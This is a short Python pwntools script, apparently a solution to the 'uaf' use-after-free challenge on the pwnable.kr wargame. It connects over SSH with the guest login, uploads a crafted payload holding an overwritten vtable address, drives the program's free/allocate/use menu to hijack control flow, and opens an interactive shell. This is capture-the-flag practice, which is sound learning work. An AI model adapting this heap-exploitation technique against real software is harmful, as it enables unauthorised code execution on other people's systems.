from pwn import *

s = ssh("uaf", "pwnable.kr", port=2222, password="guest")

s.process(['mkdir', '/tmp/qazs'])

s.upload_data(b'\x68\x15\x40\x00\x00\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00', '/tmp/qazs/mkopl')

p = s.process(executable = './uaf', argv=['uaf', '16', '/tmp/qazs/mkopl'])

print(p.recvuntil(b'free\n').decode())

p.sendline('3'.encode())
p.sendline('2'.encode())
p.sendline('2'.encode())
p.sendline('1'.encode())

print(p.recv(1024).decode())

p.interactive()